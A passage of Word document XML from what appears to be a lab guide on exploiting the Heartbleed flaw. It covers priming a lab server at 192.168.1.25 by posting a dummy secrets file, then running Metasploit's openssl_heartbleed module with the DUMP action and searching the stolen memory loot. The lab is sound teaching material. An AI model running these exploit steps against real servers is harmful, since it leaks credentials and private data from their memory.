    <w:p w14:paraId="226DAE88" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t>nano secrets.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CD63AE" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>you should now fill this file with a huge number of test data. you should enter the line "value=password123456" several thousand times to ensure we have a large enough dataset for the exploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367606F8" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>You can use the "Ctrl + Shift + Arrow Key" to highlight text, the "Ctrl + K" command to cut text and the "Ctrl + U" command to copy data in order to speed the process up.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F61C20" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>You can exit the file using "Ctrl + X" then "y" and then hit "Enter" to save the new file. Check the size of the file by entering the following command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A1F521" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">ls -l </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1445D659" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">this will list all files in the directory with their access settings and size, which you should ensure has a size of over 10,000. If it is not, enter the </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563CC243" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">nano secret.txt </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F56B70" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>command again and continue to create data in the file, saving it as per the previous instructions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2927A57E" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00996F64" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251962368" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="08D5529A" wp14:editId="7ACE8C79">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>4930140</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1441450</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1295400" cy="701040"/>
                <wp:effectExtent l="38100" t="0" r="19050" b="60960"/>
                <wp:wrapNone/>
                <wp:docPr id="393" name="Straight Arrow Connector 393"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipH="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="1295400" cy="701040"/>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1CDC190" id="Straight Arrow Connector 393" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:388.2pt;margin-top:113.5pt;width:102pt;height:55.2pt;flip:x;z-index:251962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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
                <w10:wrap anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251961344" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="60EFF671" wp14:editId="70CE29E2">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>2827020</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1357630</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2918460" cy="822960"/>
                <wp:effectExtent l="38100" t="0" r="15240" b="72390"/>
                <wp:wrapNone/>
                <wp:docPr id="394" name="Straight Arrow Connector 394"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipH="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="2918460" cy="822960"/>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F8DE18" id="Straight Arrow Connector 394" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:222.6pt;margin-top:106.9pt;width:229.8pt;height:64.8pt;flip:x;z-index:251961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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
                <w10:wrap anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3029C554" wp14:editId="4D83F5AA">
            <wp:extent cx="5384520" cy="3040380"/>
            <wp:effectExtent l="0" t="0" r="6985" b="762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33">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="15998" t="5680" r="55134" b="61376"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5400072" cy="3049161"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7104ABB6" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">We will now send the file to the server using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> utility, a Linux version of FTP (sort of).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3C5642" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Enter the following command to send the file from the Kali VM to the Heartbleed Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C6069B" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA68A8">
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA68A8">
        <w:t xml:space="preserve"> --post-file=secrets</w:t>
      </w:r>
      <w:r>
        <w:t>.txt</w:t>
      </w:r>
      <w:r w:rsidRPr="00AA68A8">
        <w:t xml:space="preserve"> https://</w:t>
      </w:r>
      <w:r>
        <w:t>192.168.1.25</w:t>
      </w:r>
      <w:r w:rsidRPr="00AA68A8">
        <w:t>/index.php --no-check-certificate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF83FFA" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">repeat this about 10 times to ensure the server's memory buffer is suitably full of data for us to steal. You can use the up arrow to recall previous commands </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>entered into</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the terminal session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DBB2139" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00996F64" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="3EF68BE2" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="001726F8">
        <w:t>Step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5:</w:t>
      </w:r>
      <w:r w:rsidRPr="001726F8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Configure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>MetaSploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D454C8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>to Exploit the Heartbleed Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13612077" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">We will be using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>MetaSploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> tool in order to exploit the server’s Heartbleed vulnerability. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10273406" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">Start the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>MetaSploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Framework by entering the following command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0385E6" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6134997A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>From here we can set up the attack and run it against out vulnerable server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F0BDC1" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Enter the command to open the Heartbleed exploit tool:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AC662F" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B86386">
        <w:t>use auxiliary/scanner/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B86386">
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B86386">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B86386">
        <w:t>openssl_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B86386">
        <w:t>heartbleed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D90771" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Display the options and actions we can change by using the following commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFF693F" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">show </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>options</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="60755EA4" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00F17BA8" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">show </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>actions</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="11BCA1BB" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00996F64" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A7465E7" wp14:editId="3170694C">
            <wp:extent cx="4134010" cy="1698723"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>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16114" t="39511" r="21112" b="8357"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4168924" cy="1713070"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9548D8" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00996F64" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A507ABF" wp14:editId="5C81C96D">
            <wp:extent cx="4157062" cy="1595708"/>
            <wp:effectExtent l="0" t="0" r="0" b="508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35">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="15805" t="67135" r="52489" b="8269"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4206357" cy="1614630"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="56184C00" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>We need to set the remote host address (the IP address of the server we wish to attack) and what we want to do with the information we gain from the server once it has been exploited.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D288B6A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Use the following commands to set the IP address of the remote host:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17796589" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00996F64" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B86386">
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:r w:rsidRPr="00F41163">
        <w:t>RHOSTS 192.168.</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00F41163">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>25</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2738EE58" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Use the following command to dump the contents of the attack once we have exploited the server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1C7AF0" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B86386">
        <w:t xml:space="preserve">set action </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B86386">
        <w:t>DUMP</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A52247" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00996F64" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A1944D8" wp14:editId="3673020A">
            <wp:extent cx="4633472" cy="461260"/>
            <wp:effectExtent l="0" t="0" r="2540" b="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36">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="15855" t="85028" r="51284" b="8361"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4785368" cy="476381"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B20D683" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">Use the following command to see more output from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>MSFConsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> whilst the attack takes place:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D21576" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B86386">
        <w:t xml:space="preserve">set verbose </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B86386">
        <w:t>true</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="778E40B5" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7521FEF0" wp14:editId="343E3E11">
            <wp:extent cx="4641156" cy="441259"/>
            <wp:effectExtent l="0" t="0" r="0" b="381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37">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="15925" t="85267" r="52035" b="8577"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4721554" cy="448903"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="27554EB9" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB9E980" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="001726F8">
        <w:lastRenderedPageBreak/>
        <w:t>Step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 6:</w:t>
      </w:r>
      <w:r w:rsidRPr="001726F8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Exploit the Heartbleed Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3F8242" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Now all we need to do is enact the attack!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5874DEA3" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Type the following command to exploit the Heartbleed Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168E0A0E" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B86386">
        <w:t>exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622471B5" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">This attack will now dump the full contents of the server's memory buffer, where it stores </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>information</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> it may be currently processing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2B168E" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="2F0D0B58" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>You can n</w:t>
      </w:r>
      <w:r w:rsidRPr="00C24614">
        <w:t>ow scroll through the output and see if you have</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> stolen</w:t>
      </w:r>
      <w:r w:rsidRPr="00C24614">
        <w:t xml:space="preserve"> anything useful</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the server's memory buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22790CEE" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00996F64" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="52DFD5D6" wp14:editId="701B4D67">
            <wp:extent cx="4979254" cy="2757972"/>
            <wp:effectExtent l="0" t="0" r="0" b="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16300" t="21206" r="21089" b="8705"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5018683" cy="2779811"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F1D7C3" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00C24614">
        <w:t xml:space="preserve">It may take more than one attempt to get the data you </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C24614">
        <w:t>want</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and you may need to upload the secrets.txt file more times in order to ensure the data is fresh in the server's memory buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EF0A64" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00C24614">
        <w:t>If you would rather search</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and parse</w:t>
      </w:r>
      <w:r w:rsidRPr="00C24614">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">through </w:t>
      </w:r>
      <w:r w:rsidRPr="00C24614">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>data dump</w:t>
      </w:r>
      <w:r w:rsidRPr="00C24614">
        <w:t xml:space="preserve"> file, it is stored in /root</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C24614">
        <w:t>/.msf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C24614">
        <w:t>4/loot</w:t>
      </w:r>
      <w:r>
        <w:t>. Y</w:t>
      </w:r>
      <w:r w:rsidRPr="00C24614">
        <w:t xml:space="preserve">ou can </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">use the grep tool to search for any </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>particular strings</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or interesting information you hope to steal from the vulnerable server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6E5ACC" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="008926CE" w:rsidRDefault="0023150F" w:rsidP="0023150F">
